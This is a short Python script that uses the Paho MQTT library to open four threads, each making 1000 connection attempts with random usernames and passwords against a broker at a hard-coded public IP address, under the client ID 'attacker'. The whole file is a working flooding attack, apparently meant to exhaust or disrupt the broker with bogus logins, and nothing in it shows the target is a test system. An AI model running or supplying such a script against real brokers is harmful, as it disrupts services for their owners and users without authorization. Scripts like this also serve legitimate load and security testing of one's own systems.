import paho.mqtt.client as mqtt #import the Paho MQTT client package
import threading
import time
import string
import random

def on_connect(client, userdata, flags, rc):
    print("Connected flags: ",str(flags),"result code ",str(rc))

def makeConnection():
	for _ in range(1000):
		broker_address="52.87.165.252"
		client = mqtt.Client("attacker",clean_session=True) #create new instance
		length_username = random.randint(10,50)
		length_password = random.randint(10,50)
		_username = ''.join(random.choices(string.ascii_uppercase + string.digits, k = length_username))
		_password = ''.join(random.choices(string.ascii_uppercase + string.digits, k = length_password))
		client.username_pw_set(username=_username,password=_password)
		client.on_connect = on_connect
		client.loop_start()  #start the call back loop
		client.connect(broker_address) #connect to broker
		time.sleep(3) # wait
		client.loop_stop()  #stop the call back loop
		client.disconnect()


thread1 = threading.Thread(target=makeConnection)
thread2 = threading.Thread(target=makeConnection)
thread3 = threading.Thread(target=makeConnection)
thread4 = threading.Thread(target=makeConnection)


thread1.start()
thread2.start()
thread3.start()
thread4.start()

thread1.join()
thread2.join()
thread3.join()
thread4.join()
